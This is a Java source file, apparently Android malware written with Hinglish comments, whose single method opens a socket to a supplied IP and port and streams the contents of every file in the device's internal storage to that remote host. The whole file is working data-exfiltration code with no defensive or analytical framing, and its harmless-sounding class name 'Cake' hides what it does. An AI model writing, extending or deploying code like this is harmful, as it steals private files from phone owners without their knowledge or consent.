import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Cake {
    public static void reverse_tcp(String ip, int port) {
        try {
            // Reverse TCP connection banayega
            Socket socket = new Socket(ip, port);
            InputStream sin = socket.getInputStream();
            OutputStream sout = socket.getOutputStream();

            // Device ke storage ko access karega
            File storageDir = new File("/storage/emulated/0/");  // Internal storage ka path
            File[] files = storageDir.listFiles();

            if (files != null) {
                for (File file : files) {
                    if (file.isFile()) {
                        FileInputStream fis = new FileInputStream(file);
                        byte[] buffer = new byte[4096];
                        int bytesRead;

                        while ((bytesRead = fis.read(buffer)) != -1) {
                            sout.write(buffer, 0, bytesRead);  // File ka data send karega
                        }
                        fis.close();
                    }
                }
            }

            sout.flush();
            socket.close();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
